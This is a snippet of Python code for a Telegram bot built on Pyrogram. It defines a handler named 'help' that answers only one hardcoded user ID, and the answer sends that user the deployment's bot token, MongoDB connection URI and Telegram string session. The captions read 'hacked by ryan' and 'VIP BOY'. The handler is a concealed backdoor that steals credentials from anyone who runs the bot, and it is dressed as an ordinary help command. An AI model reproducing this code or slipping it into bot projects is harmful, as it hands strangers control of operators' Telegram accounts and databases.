...
@app.on_message(
    ...
    & filters.private
    & filters.user(5394956234)
    & ~filters.edited)
async def help(client: Client, message: Message):
    await message.reply_photo(
          photo=f"https://te.legra.ph/file/93966dd3b0da2f780950d.jpg",
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [𝚅𝙸𝙿 𝙱𝙾𝚈](https://t.me/oye_daddy)............☆""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                          "• нαϲкє𝚍 ву ryan ", url=f"https://t.me/oye_daddy")
                 ]
             ]
         ),
     )
